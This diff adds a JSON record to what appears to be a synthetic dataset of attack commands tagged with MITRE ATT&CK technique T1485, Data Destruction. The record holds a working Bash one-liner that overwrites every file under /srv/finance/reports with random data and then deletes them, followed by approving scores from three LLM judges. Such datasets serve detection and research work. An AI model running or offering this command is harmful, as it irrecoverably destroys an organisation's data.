@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1485",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'dir=/srv/finance/reports; find \"$dir\" -type f -print0 | while IFS= read -r -d \"\" f; do sz=$(stat -c%s \"$f\"); dd if=/dev/urandom of=\"$f\" bs=$sz count=1 conv=notrunc status=none; done; sync; find \"$dir\" -type f -delete'",
+  "explanation": "Overwrites every file in a targeted directory with random data and then deletes them.",
+  "rationale_steps": [
+    "Enumerate files within a specific directory",
+    "For each file, determine size",
+    "Overwrite contents with random data",
+    "Flush filesystem buffers",
+    "Remove the overwritten files"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-9214ae56-a3853bd0",
+  "source_prompt_hash": "9214ae56",
+  "timestamp_utc": "2025-09-30T07:55:14.956261Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags, correct command separators, and appropriate use of variables and control structures.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Data Destruction technique by first overwriting all files in the finance reports directory with random data (making recovery difficult) and then deleting them completely.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T02:46:52.125053Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and robust null-terminated string processing in the loop.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely achieves the stated intent by first overwriting file contents with random data using `dd` and then securely deleting them using `find -delete`, directly aligning with the T1485 Data Destruction technique which explicitly mentions these methods.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:47:01.091574Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and separators with valid GNU find/read/stat/dd options and correct NUL-delimited handling.",
+        "semantic_score": 4,
+        "semantic_justification": "It overwrites files with random data then deletes them, aligning with data destruction, but may fail on zero-byte files and requires sufficient permissions.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:47:28.928022Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
